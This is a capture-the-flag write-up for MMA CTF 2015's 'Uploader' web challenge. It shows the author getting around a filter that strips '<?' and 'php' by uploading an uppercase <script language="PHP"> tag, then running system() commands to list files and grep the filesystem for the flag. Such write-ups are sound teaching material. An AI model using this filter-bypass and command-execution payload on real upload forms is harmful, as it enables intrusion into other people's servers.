{"pageContext":{"html":"<p><a href=\"ctf=mma-ctf-2015\"></a>\n<a href=\"type=web\"></a>\n<a href=\"tags=php,lfi,rce\"></a>\n<a href=\"tools=\"></a>\n<a href=\"techniques=\"></a></p>\n<h1>Uploader (web-100)</h1>\n<p>Website says 'You can upload any file!', and really lets us. But when uploading text files, it removes any '&#x3C;?' or 'php' as mentioned in the problem. Obviously, this question is based on LFI+Remote Code Execution, we need to get our php running there somehow. First I tried uploading various variations of php hello world, like:</p>\n<pre><code class=\"language-php\">&#x3C;?php echo 'Hello world!';\n</code></pre>\n<pre><code class=\"language-php\">&#x3C;? echo 'Hello world!';\n</code></pre>\n<pre><code class=\"language-shell\">#!/usr/bin/php -r\necho 'Hello world!';\n</code></pre>\n<p>Nothing seemed to work. Since '&#x3C;?'s are being removed, I tried:</p>\n<pre><code class=\"language-php\">&#x3C;&#x3C;?? echo 'Hello world!';\n</code></pre>\n<p>Still, no use.</p>\n<p>Is it possible to run without &#x3C;? tags?</p>\n<p>After googling, we see from php manual page that, we can use these tags instead:</p>\n<pre><code class=\"language-php\">&#x3C;script language=\"php\"> echo('Hello world!'); &#x3C;/script>\n</code></pre>\n<p>But after uploading, the word 'php' is removed, resulting in</p>\n<pre><code class=\"language-php\">&#x3C;script language=\"\"> echo('Hello world!'); &#x3C;/script>\n</code></pre>\n<p>I was out of ideas. But after a long time, I realized that question only talks about removing 'php', but does it remove 'PHP' (uppercase) ? Let's find out:</p>\n<pre><code class=\"language-php\">&#x3C;script language=\"PHP\"> echo('Hello world!'); &#x3C;/script>\n</code></pre>\n<p>Success! We got our php\nrunning, now we just have to look for the flag.</p>\n<p>First, let me check a few variables</p>\n<pre><code class=\"language-php\">&#x3C;script language=\"PHP\">\necho $flag;\nprint_r(get_defined_vars());\nprint_r(get_defined_constants());\n&#x3C;/script>\n</code></pre>\n<p>Nope, nothing here. Let's look at some files:</p>\n<pre><code class=\"language-php\">&#x3C;script language=\"PHP\">\nsystem(\"ls\");\n&#x3C;/script>\n</code></pre>\n<p>Nothing useful here, let's do a full system search:</p>\n<pre><code class=\"language-php\">&#x3C;script language=\"PHP\"> echo system(\"egrep -rnis 'MMA{' /\"); &#x3C;/script>\n</code></pre>\n<p>Aaand we get our flag:</p>\n<blockquote>\n<p>MMA{you can run php from script tag}</p>\n</blockquote>"}}